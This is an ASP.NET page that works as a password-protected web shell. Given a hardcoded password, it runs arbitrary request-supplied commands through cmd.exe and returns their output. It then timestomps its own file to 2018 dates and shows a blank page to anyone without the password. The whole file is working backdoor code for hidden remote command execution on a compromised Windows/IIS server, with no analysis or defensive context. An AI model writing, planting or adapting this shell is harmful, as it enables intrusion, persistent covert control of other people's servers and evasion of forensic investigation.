<%@ Page Language="C#" Debug="false" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request["password"] != null && Request["password"] == "28112016")
        {
            Response.Write(@"
                <div style='position: fixed; top: 0; left: 0; width: 100%; background-color: #f0f0f0; padding: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.2);'>
                    <form method='get'>
                        Command: <input type='text' name='execute' style='width: 70%;' />
                        <input type='hidden' name='password' value='28112016' />
                        <input type='submit' value='Execute' />
                    </form>
                </div>
                <div style='margin-top: 100px;'>
            ");

            if (Request["execute"] != null)
            {
                string cmdCommand = Request["execute"];
                if (!string.IsNullOrEmpty(cmdCommand))
                {
                    try
                    {
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = "cmd.exe";
                        psi.Arguments = "/c " + cmdCommand;
                        psi.RedirectStandardOutput = true;
                        psi.RedirectStandardError = true;
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;

                        Process process = Process.Start(psi);
                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();

                        Response.Write("<pre style='background-color: #f0f0f0; color: #000; padding: 10px; font-family: Consolas, monospace; border: 1px solid #ccc;'>" + output + "</pre>");
                        if (!string.IsNullOrEmpty(error))
                        {
                            Response.Write("<pre style='background-color: #f0f0f0; color: red; padding: 10px; font-family: Consolas, monospace; border: 1px solid #ccc;'>" + error + "</pre>");
                        }

                        string filePath = Server.MapPath(Request.Path);
                        System.IO.File.SetCreationTime(filePath, new DateTime(2018, 11, 15));
                        System.IO.File.SetLastWriteTime(filePath, new DateTime(2018, 11, 15));
                        System.IO.File.SetLastAccessTime(filePath, new DateTime(2018, 11, 15));
                    }
                    catch (Exception ex)
                    {
                        Response.Write("<pre style='color:red;'>Error: " + ex.Message + "</pre>");
                    }
                }
            }

            Response.Write("</div>");
        }
        else
        {
            Response.Clear();
        }
    }
</script>

<html>
<body>
</body>
</html>
